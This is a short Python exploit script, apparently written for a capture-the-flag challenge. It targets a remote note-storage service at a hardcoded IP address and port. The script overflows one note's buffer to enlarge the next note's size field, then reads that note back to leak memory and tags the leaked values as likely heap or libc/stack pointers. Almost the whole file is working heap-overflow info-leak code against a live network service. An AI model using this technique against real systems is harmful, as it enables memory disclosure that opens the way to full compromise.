import socket, struct, time, sys
HOST, PORT = "13.206.57.188", 10063
def p64(x): return struct.pack("<Q", x & (2**64-1))
def u64(b): return struct.unpack("<Q", b.ljust(8,b"\0")[:8])[0]

class T:
    def __init__(self):
        self.s = socket.socket(); self.s.settimeout(6); self.s.connect((HOST,PORT))
        self.buf=b""; self._until(b"Give me your command:\n")
    def _recv(self,t=1.5):
        self.s.settimeout(t); 
        try:
            while True:
                c=self.s.recv(4096)
                if not c: break
                self.buf+=c
        except socket.timeout: pass
    def _until(self, marker, t=2.0):
        end=time.time()+t
        while marker not in self.buf and time.time()<end:
            self._recv(0.4)
        i=self.buf.find(marker)
        if i<0: out=self.buf; self.buf=b""; return out
        out=self.buf[:i]; self.buf=self.buf[i+len(marker):]; return out
    def cmd(self,line,raw=None):
        self.s.sendall(line.encode()+b"\n")
        if raw is not None:
            self.s.sendall(raw)
        return self._until(b"Give me your command:\n")
    def C(self,idx,size): return self.cmd(f"C {idx} {size}")
    def W(self,idx,off,data): return self.cmd(f"W {idx} {off} {len(data)}", data)
    def R(self,idx):
        # read_note prints data (size bytes) + "\n" then "Give me your command:"
        return self.cmd(f"R {idx}")
    def D(self,idx): return self.cmd(f"D {idx}")

if __name__=="__main__":
    t=T()
    for i in range(8): print(i, t.C(i,0x18).strip())
    # overflow note0 data -> set note1.size = 0x400 (off 0x28 = s1.size if layout contiguous)
    print("W:", t.W(0,0x28,p64(0x400)).strip())
    out=t.R(1)
    # strip trailing newline before prompt
    data=out
    print("R1 len", len(data))
    for off in range(0,min(len(data),0x120),8):
        v=u64(data[off:off+8])
        tag=""
        if 0x5500000000<=v<=0x7fffffffffff and v&0xf==0: tag=" <HEAPish>"
        if 0x7f0000000000<=v<=0x7fffffffffff: tag=" <LIBC/STACKish>"
        print(f"  +{off:03x}: {v:016x}{tag}")
